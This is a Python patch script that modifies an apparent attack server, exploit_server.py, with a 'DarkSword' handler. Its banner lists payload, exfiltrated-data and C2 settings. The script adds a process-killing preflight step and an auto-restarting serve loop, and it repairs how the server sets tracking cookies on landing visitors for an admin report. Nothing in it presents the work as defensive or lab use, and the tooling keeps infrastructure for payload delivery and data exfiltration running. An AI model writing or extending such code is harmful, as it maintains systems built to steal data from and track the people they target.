#!/usr/bin/env python3
"""_v204_hotfix15v6.py — correct anchor + correct OLD_P1 scope
PATCH ORDER (high offset first to avoid low offset shift):
  1) PATCH-MAIN (L~3895 → ~__main__ prev) — highest offset >189k
  2) PATCH-EXPIRES (L~2586 do_GET bug block) — offset ~119k (low, unaffected)
  3) PATCH-PURGE (insert above banner line) — inside PATCH-MAIN (no separate patch)
"""
import os, sys, re, shutil, ast, py_compile
ESFILE = os.path.abspath(__file__).replace('_v204_hotfix15v6.py', 'exploit_server.py')
if not os.path.isfile(ESFILE):
    print(f'[FATAL] exploit_server.py not found: {ESFILE}'); sys.exit(1)

# ========== 0. SELF AST CHECK ==========
_self_src = open(__file__, 'r', encoding='utf-8').read()
try:
    ast.parse(_self_src)
    py_compile.compile(__file__, doraise=True)
    print('[SELF-AST-OK] hotfix15v6 self AST PASS')
except SyntaxError as e:
    print(f'[SELF-AST-FAIL] L{e.lineno} off={e.offset}: {e.msg}'); sys.exit(2)

# ========== 1. READ ORIGINAL ==========
src_b = open(ESFILE, 'rb').read()
ORIG_SIZE = len(src_b)
# Detect newline style
for ORIG_NL in (b'\r\n', b'\n', b'\r'):
    if ORIG_NL in src_b:
        break
else:
    ORIG_NL = b'\n'

src = src_b.decode('utf-8', errors='replace')
lines = src.split('\n')
if ORIG_NL == b'\r\n':
    src = src.replace('\r\n', '\n')
    lines = src.split('\n')

# Backup
BAKDIR = os.path.join(os.path.dirname(ESFILE), 'bak_v204_hotfix15v6')
os.makedirs(BAKDIR, exist_ok=True)
import time as _bt
bak = os.path.join(BAKDIR, f'exploit_server.py.bak-{_bt.strftime("%Y%m%d%H%M%S")}')
shutil.copy2(ESFILE, bak)
print(f'[BAK] {bak} (size={ORIG_SIZE})')
print(f'[INFO] ORIG_NL={ORIG_NL!r} total lines={len(lines)} orig_size={ORIG_SIZE}')

# ========== 2. PATCH-MAIN anchor (CORRECT THIS TIME) ==========
# Strategy: find ALL occurrences of r'\n    banner = f"""\n' (exactly indent 4 spaces, i.e. main-body level)
# For each: check next 30 lines contain BOTH "EXPLOIT SERVER - READY" AND "Access URL:"
# START offset = START of the "    banner = f..." line
# END offset = start of the line that matches r'^if __name__ == "__main__":'

banner_re = re.compile(r'(?m)^    banner = f"""\n')  # indent_n=4 exactly
main_re = re.compile(r'(?m)^if __name__ == ["\']__main__["\']:\s*\n')

candidates = list(banner_re.finditer(src))
print(f'[PATCH1-LOC] banner=f occurrences: {len(candidates)}')
banner_start = None
banner_line = None
banner_indent = 4
for i, m in enumerate(candidates, 1):
    line_start_pos = m.start()
    L = 1 + src[:line_start_pos].count('\n')
    window_end = min(len(lines), L + 30)
    window = '\n'.join(lines[L-1:window_end])
    has_ready = 'EXPLOIT SERVER - READY' in window
    has_access = 'Access URL:' in window
    real = has_ready and has_access
    print(f'  #{i} L{L} offset={line_start_pos} indent_n=4 EXPLOIT={["NO","YES"][has_ready]} ACCESS={["NO","YES"][has_access]} -> {["IGNORE","REAL-MAIN"][real]}')
    if real:
        banner_start = line_start_pos
        banner_line = L

# Fallback: scan from line 3870 to 3920 looking for 'banner = f"""'
if banner_start is None:
    L_FB = None
    for lx in range(3869, min(len(lines), 3925)):
        if lines[lx].startswith('    banner = f"""') and 'EXPLOIT SERVER - READY' in '\n'.join(lines[lx:min(len(lines),lx+35)]):
            L_FB = lx; break
    if L_FB is None:
        print('[FATAL] banner REAL-MAIN anchor not found + fallback failed'); sys.exit(5)
    banner_start = sum(len(x)+1 for x in lines[:L_FB])  # +1 for \n separator (we unified)
    banner_line = L_FB + 1
    print(f'[PATCH1-LOC-FB] use L{banner_line} offset={banner_start}')

# END offset: start of the if __name__ == "__main__": line
mm = main_re.search(src)
if not mm:
    print('[FATAL] __main__ not found'); sys.exit(5)
__main__line = mm.start()
__main__L = 1 + src[:__main__line].count('\n')
print(f'[PATCH1-LOC] __main__ line L{__main__L} start byte={__main__line}')

# OLD_P1: [banner_start .. __main__line)
# BUT: need to skip any leading blank lines before __main__ so OLD_P1 ends neatly.
# Search backwards from __main__line for the LAST non-blank character (so we cut *after*
# the last code/sleep line but *before* all blank lines separating it from __main__).
pre_main = src[banner_start:__main__line]
cut_rel = len(pre_main.rstrip('\n'))
# Go 1 past the last newline stripped (so include the trailing \n of last code line):
while cut_rel < len(pre_main) and pre_main[cut_rel:cut_rel+1] == '\n':
    cut_rel += 1
P1_START = banner_start
P1_END = banner_start + cut_rel
OLD_P1 = src[P1_START:P1_END]
print(f'[PATCH1-SELECT] start={P1_START} end={P1_END} len={len(OLD_P1)} TI_n=4 L_start={banner_line} L_end_before={1 + src[:P1_END].count(chr(10))}')
if len(OLD_P1) < 200 or len(OLD_P1) > 12000:
    print(f'[FATAL] OLD_P1 size insane ({len(OLD_P1)}), bailing'); sys.exit(5)

# indentation: TI = 4 spaces = 1 unit
_S = lambda n: '    '*n
TI_N = 4
U = TI_N // 4  # = 1
T = lambda lv: _S(U + lv - 1)
assert T(1) == _S(1)
assert T(2) == _S(2)
assert T(3) == _S(3)
assert T(4) == _S(4)

# Build NEW_P1 — 100% use T(lv) for indent, no hardcoded spaces
NEW_P1_LIST = []
NEW_P1_LIST.extend([
T(1), 'banner = f"""\n',
'╔══════════════════════════════════════════════════════════════╗\n',
'║              EXPLOIT SERVER - READY                          ║\n',
'╠══════════════════════════════════════════════════════════════╣\n',
'║  Access URL:     http://{args.host}:{args.port}/\n',
'║                  http://localhost:{args.port}/\n',
'║  C2 DNS hijack:  Internal DNS -> {args.host}:80 (if bound)\n',
'║  Payloads dir:   {PAYLOADS_DIR}\n',
'║  Templates dir:  {TEMPLATES_DIR}\n',
'║  Exfil data dir: {EXFIL_DIR}\n',
'║  Log file:       {LOG_FILE}\n',
'║  DB available:   {DB_AVAILABLE}\n',
'╚══════════════════════════════════════════════════════════════╝\n',
'"""\n',
T(1), 'if C2_HOST:\n',
T(2), 'banner += f"║  C2 Host:        {C2_HOST}\\\\n"\n',
T(1), 'if REDIRECT_URL:\n',
T(2), 'banner += f"║  Redirect URL:   {REDIRECT_URL}\\\\n"\n',
T(1), 'banner += "╚══════════════════════════════════════════════════════════════╝\\\\n"\n',
T(1), 'banner += "\\\\n[!] Press Ctrl+C to stop\\\\n"\n',
T(1), '\n',
T(1), 'print(banner)\n',
T(1), 'startup_log = f"Exploit server started on http://{args.host}:{args.port} | DB={DB_AVAILABLE}"\n',
T(1), 'log_to_file(startup_log)\n',
T(1), 'log_to_file(f"Payloads: {PAYLOADS_DIR}")\n',
T(1), 'log_to_file(f"Exfil dir: {EXFIL_DIR}")\n',
T(1), 'log_to_file(f"Log file: {LOG_FILE}")\n',
T(1), '\n',
# HF15v6: PREFLIGHT-PURGE (kill stale exploit_server processes, EXCLUDE self/nginx/mysqld/supervisord)
T(1), '# HF15v6 PREFLIGHT-PURGE: kill stale exploit_server processes (EXCLUDE self/nginx/mysqld/supervisord)\n',
T(1), 'try:\n',
T(2), 'import os as _po_os, signal as _po_sig\n',
T(2), '_my_pid = _po_os.getpid()\n',
T(2), 'for _pdir in __import__("glob").glob("/proc/[0-9]*"):\n',
T(3), 'try:\n',
T(4), '_pid = int(_pdir.rsplit("/",1)[-1])\n',
T(4), 'if _pid == _my_pid or _pid <= 1: continue\n',
T(4), 'with open(_pdir + "/cmdline","rb") as _pcf:\n',
T(5), '_cmd = _pcf.read().replace(b"\\x00",b" ").decode("utf-8","ignore").strip()\n',
T(4), 'if not _cmd: continue\n',
T(4), '_lower = _cmd.lower()\n',
T(4), 'if "exploit_server.py" not in _lower: continue\n',
T(4), 'if "nginx" in _lower or "mysqld" in _lower or "supervisor" in _lower: continue\n',
T(4), 'try:\n',
T(5), '_po_os.kill(_pid, _po_sig.SIGKILL)\n',
T(5), 'print(f"[PREFLIGHT-PURGE] killed stale pid={_pid} cmd={_cmd[:120]!r}", flush=True)\n',
T(4), 'except Exception:\n',
T(5), 'pass\n',
T(3), 'except Exception:\n',
T(4), 'continue\n',
T(1), 'except Exception as _purge_e:\n',
T(2), 'print(f"[PREFLIGHT-PURGE] err {type(_purge_e).__name__}: {_purge_e}", flush=True)\n',
T(1), '\n',
# HF15v6 markers + self-connect probe
T(1), 'import socket as _diag_sk, os as _diag_os, sys as _diag_sys, time as _diag_tm\n',
T(1), 'try:\n',
T(2), '_ds_pid = _diag_os.getpid()\n',
T(2), '_ds_ppid = _diag_os.getppid()\n',
T(2), '_ds_pgid = _diag_os.getpgrp() if hasattr(_diag_os, "getpgrp") else -1\n',
T(2), 'print(f"[DS-READY-HF15v6] pid={_ds_pid} ppid={_ds_ppid} pgid={_ds_pgid} port={args.port} -> infinite LOOP", flush=True)\n',
T(2), '_diag_sys.stdout.flush(); _diag_sys.stderr.flush()\n',
T(2), '_s1 = _diag_sk.socket(_diag_sk.AF_INET, _diag_sk.SOCK_STREAM)\n',
T(2), '_rr = _s1.connect_ex(("127.0.0.1", int(args.port)))\n',
T(2), 'print(f"[DS-READY-HF15v6] self-connect_ex 127.0.0.1:{args.port}={_rr} (0=OK)", flush=True)\n',
T(2), '_s1.close()\n',
T(1), 'except Exception as _diag_e:\n',
T(2), 'print(f"[DS-READY-HF15v6] probe err {type(_diag_e).__name__}: {_diag_e}", flush=True)\n',
T(1), '\n',
# HF15v6 WHILE TRUE serve_forever NO SUICIDE
T(1), '_ds_attempt = 0\n',
T(1), 'while True:\n',
T(2), '_ds_attempt += 1\n',
T(2), 'print(f"[DS-SF-LOOP] attempt={_ds_attempt} -> serve_forever(poll=0.3)", flush=True)\n',
T(2), 'try:\n',
T(3), 'server.serve_forever(poll_interval=0.3)\n',
T(2), 'except KeyboardInterrupt:\n',
T(3), 'stop_msg = "Server stopped by user."\n',
T(3), 'print(f"\\\\n[*] {stop_msg}")\n',
T(3), 'try: log_to_file(stop_msg)\n',
T(3), 'except Exception: pass\n',
T(3), 'try: server.shutdown()\n',
T(3), 'except Exception: pass\n',
T(3), 'break\n',
T(2), 'except SystemExit as _ds_se:\n',
T(3), 'print(f"[DS-SF-EXIT] SystemExit(code={_ds_se.code}) -> propagate", flush=True)\n',
T(3), 'try: log_to_file(f"[DS-SF-EXIT] SystemExit {_ds_se.code}")\n',
T(3), 'except Exception: pass\n',
T(3), 'raise\n',
T(2), 'except BaseException as _ds_sf_e:\n',
T(3), 'import traceback as _ds_tb\n',
T(3), '_ts = _diag_tm.strftime("%Y-%m-%d %H:%M:%S")\n',
T(3), '_msg = f"[DS-CRASH-SF-{_ds_attempt}] [{_ts}] pid={_ds_pid} {type(_ds_sf_e).__name__}: {_ds_sf_e}"\n',
T(3), 'print(_msg, flush=True)\n',
T(3), 'try: log_to_file(_msg)\n',
T(3), 'except Exception: pass\n',
T(3), '_ds_tb.print_exc()\n',
T(3), 'if _ds_attempt >= 5:\n',
T(4), 'print(f"[DS-CRASH-SF] crash {_ds_attempt} times -> SystemExit(88)", flush=True)\n',
T(4), 'raise SystemExit(88)\n',
T(3), 'print(f"[DS-CRASH-SF] 3s retry {_ds_attempt+1}th serve_forever...", flush=True)\n',
T(3), 'try:\n',
T(4), '_diag_tm.sleep(3)\n',
T(3), 'except (KeyboardInterrupt, SystemExit): pass\n',
T(3), 'try: server.shutdown()\n',
T(3), 'except Exception: pass\n',
T(3), 'try: server.server_close()\n',
T(3), 'except Exception: pass\n',
T(3), '_diag_tm.sleep(2)\n',
T(3), 'try:\n',
T(4), 'print(f"[DS-SF-REBIND] attempt {_ds_attempt+1} rebind server...", flush=True)\n',
T(4), 'server = ReusableThreadingHTTPServer((args.host, args.port), DarkSwordHandler)\n',
T(3), 'except Exception as _rebind_e:\n',
T(4), 'print(f"[DS-SF-REBIND] failed: {type(_rebind_e).__name__}: {_rebind_e}", flush=True)\n',
T(4), '_diag_tm.sleep(2)\n',
T(1), 'print(f"[DS-SF-LOOP-END] exit", flush=True)\n',
T(1), 'try: server.shutdown()\n',
T(1), 'except Exception: pass\n',
'\n\n',
])
NEW_P1 = ''.join(NEW_P1_LIST)

# SELF-TEST NEW_P1 AST inside a mock def main():
def _TEST_NEW_P1_SYNTAX():
    mock = (
        'def _mock_main():\n'
        '    import os, time, sys, socket, signal\n'
        '    class _SRV:\n'
        '        def serve_forever(self, poll_interval=0.3): pass\n'
        '        def shutdown(self): pass\n'
        '        def server_close(self): pass\n'
        '    server = _SRV()\n'
        '    args = type("A", (), {"host":"0.0.0.0","port":7070})()\n'
        '    PAYLOADS_DIR=TEMPLATES_DIR=EXFIL_DIR=LOG_FILE="/tmp/x"\n'
        '    DB_AVAILABLE="YES"\n'
        '    C2_HOST=None\n'
        '    REDIRECT_URL=None\n'
        '    def log_to_file(m): pass\n'
        '    def ReusableThreadingHTTPServer(bind, hdl): return _SRV()\n'
        '    def DarkSwordHandler(*a,**k): pass\n'
        + NEW_P1
    )
    try:
        ast.parse(mock); compile(mock, '<newp1>', 'exec')
        print('[PATCH1 NEW_P1 SYNTAX-SELFTEST] OK')
    except (SyntaxError, IndentationError) as e:
        print(f'[PATCH1 NEW_P1 SYNTAX-SELFTEST FAIL L{e.lineno} off={e.offset}: {e.msg}')
        mls = mock.split('\n')
        for k in range(max(0,e.lineno-8), min(len(mls), e.lineno+8)):
            print(f'  L{k+1:4d}| {mls[k][:220]}')
        shutil.copy2(bak, ESFILE); sys.exit(60)
_TEST_NEW_P1_SYNTAX()

# APPLY PATCH1 FIRST (highest offset >189k)
src = src[:P1_START] + NEW_P1 + src[P1_END:]
print(f'[PATCH1] replaced {len(OLD_P1)} -> {len(NEW_P1)} delta={len(NEW_P1)-len(OLD_P1):+d}')
try:
    ast.parse(src); print('[PATCH1 AST] PASS')
except SyntaxError as e:
    print(f'[PATCH1 AST FAIL L{e.lineno} off={e.offset}: {e.msg}')
    mls = src.split('\n')
    for k in range(max(0,e.lineno-10), min(len(mls), e.lineno+10)):
        print(f'  L{k+1:4d}| {mls[k][:220]}')
    shutil.copy2(bak, ESFILE); sys.exit(6)

# ========== 3. PATCH-EXPIRES (do_GET bug block L~2586, LOW OFFSET — apply AFTER high offset P1 so low offset relative match unaffected) ==========
# Regex: match the exact block structure:
#   if tpl_slug:
#       ... expires=...
#   # Preserve channel
#   if log_cid is not None:  ... expires ...
#   if log_tid is not None:  ... expires ...
expires_re = re.compile(
    r'(?P<indent> {8,24})if tpl_slug\s*:\s*\n'
    r'(?P=indent)    expires.*\n'
    r'(?P=indent)    self\.send_header\("Set-Cookie",\s*f?"ds_tpl=.*expires.*\n'
    r'(?P=indent)#\s*Preserve channel[^\n]*\n'
    r'(?P=indent)if log_cid[^\n]*:\s*\n'
    r'(?P=indent)    self\.send_header\("Set-Cookie",\s*f?"ds_chid=.*\{expires\}.*SameSite=Lax"\s*\)\s*\n'
    r'(?P=indent)if log_tid[^\n]*:\s*\n'
    r'(?P=indent)    self\.send_header\("Set-Cookie",\s*f?"ds_tid=.*\{expires\}.*SameSite=Lax"\s*\)\s*\n',
    re.MULTILINE
)
matches_e = list(expires_re.finditer(src))
print(f'[PATCH3-LOC] expires block candidates: {len(matches_e)}')
if len(matches_e) != 1:
    print('[FATAL] expect exactly 1 expires block (do_GET main). Bailing'); sys.exit(4)
m3 = matches_e[0]
U3_N = len(m3.group('indent'))  # actual indent spaces of the bug block (should be 12? 8? 16? auto detect)
assert U3_N % 4 == 0, f'expires block indent {U3_N} not multiple of 4'
U3 = U3_N // 4
S3 = lambda lv: _S(U3 + lv - 1)
OLD_P3 = m3.group(0)
P3_START, P3_END = m3.span()
NEW_P3 = (
    S3(1) + 'expires = ""\n'
    + S3(1) + 'try:\n'
    + S3(2) + 'if tpl_slug:\n'
    + S3(3) + 'expires = datetime.utcfromtimestamp(time() + 86400).strftime("%a, %d %b %Y %H:%M:%S GMT")\n'
    + S3(3) + 'try:\n'
    + S3(4) + 'self.send_header("Set-Cookie", f"ds_tpl={tpl_slug}; Path=/; Expires={expires}; SameSite=Lax; HttpOnly")\n'
    + S3(3) + 'except Exception as _ec3_tpl:\n'
    + S3(4) + 'print(f"[EXPIRES-FALLBACK] ds_tpl cookie fail {type(_ec3_tpl).__name__}: {_ec3_tpl}", flush=True)\n'
    + S3(2) + '# Preserve channel landing session (ch / tpl) in cookie -> admin /report can join it\n'
    + S3(2) + 'if log_cid is not None:\n'
    + S3(3) + 'try:\n'
    + S3(4) + 'self.send_header("Set-Cookie", f"ds_chid={log_cid}; Path=/; {expires}; SameSite=Lax")\n'
    + S3(3) + 'except Exception as _ec3_ch:\n'
    + S3(4) + 'print(f"[EXPIRES-FALLBACK] ds_chid cookie fail {type(_ec3_ch).__name__}: {_ec3_ch}", flush=True)\n'
    + S3(2) + 'if log_tid is not None:\n'
    + S3(3) + 'try:\n'
    + S3(4) + 'self.send_header("Set-Cookie", f"ds_tid={log_tid}; Path=/; {expires}; SameSite=Lax")\n'
    + S3(3) + 'except Exception as _ec3_tid:\n'
    + S3(4) + 'print(f"[EXPIRES-FALLBACK] ds_tid cookie fail {type(_ec3_tid).__name__}: {_ec3_tid}", flush=True)\n'
    + S3(1) + 'except BaseException as _ec3_outer:\n'
    + S3(2) + 'print(f"[EXPIRES-FALLBACK] outer fail {type(_ec3_outer).__name__}: {_ec3_outer}", flush=True)\n'
    + S3(2) + 'import traceback as _ec3_tb; _ec3_tb.print_exc()\n'
)
print(f'[PATCH3 #1] OFFSET {P3_START}:{P3_END} indent_units={U3} (spaces={U3_N})')
src = src[:P3_START] + NEW_P3 + src[P3_END:]
print(f'[PATCH3] replaced {len(OLD_P3)} -> {len(NEW_P3)} delta={len(NEW_P3)-len(OLD_P3):+d}')
try:
    ast.parse(src); print('[PATCH3 AST] PASS')
except SyntaxError as e:
    print(f'[PATCH3 AST FAIL L{e.lineno} off={e.offset}: {e.msg}')
    mls = src.split('\n')
    for k in range(max(0,e.lineno-10), min(len(mls), e.lineno+10)):
        print(f'  L{k+1:4d}| {mls[k][:220]}')
    shutil.copy2(bak, ESFILE); sys.exit(7)

# ========== 4. FINAL AST ==========
try:
    ast.parse(src); compile(src, ESFILE, 'exec')
    print('[FINAL AST] PASS')
except SyntaxError as e:
    print(f'[FINAL AST FAIL L{e.lineno} off={e.offset}: {e.msg}')
    mls = src.split('\n')
    for k in range(max(0,e.lineno-12), min(len(mls), e.lineno+12)):
        print(f'  L{k+1:4d}| {mls[k][:220]}')
    shutil.copy2(bak, ESFILE); sys.exit(9)

# ========== 5. WRITE ==========
if ORIG_NL == b'\r\n':
    fb = src.replace('\n', '\r\n').encode('utf-8')
else:
    fb = src.encode('utf-8')
with open(ESFILE, 'wb') as fw:
    fw.write(fb)
NEW_SIZE = os.path.getsize(ESFILE)
print(f'[WRITE] {ORIG_SIZE} -> {NEW_SIZE} (delta {NEW_SIZE-ORIG_SIZE:+d})')

def gr(p):
    return sorted(set(1 + src[:m.start()].count('\n') for m in re.finditer(p, src)))
print('[VERIFY] DS-READY-HF15v6  L=', gr(r'DS-READY-HF15v6'))
print('[VERIFY] DS-SF-LOOP        L=', gr(r'DS-SF-LOOP'))
print('[VERIFY] PREFLIGHT-PURGE   L=', gr(r'PREFLIGHT-PURGE'))
print('[VERIFY] EXPIRES-FALLBACK  L=', gr(r'EXPIRES-FALLBACK'))
print('[VERIFY] UnboundLocalError expires grep lines:', len(re.findall(r'[\"\'].*\{expires\}.*[\"\']', src)))
print('\n✅ HF15v6 APPLY DONE')
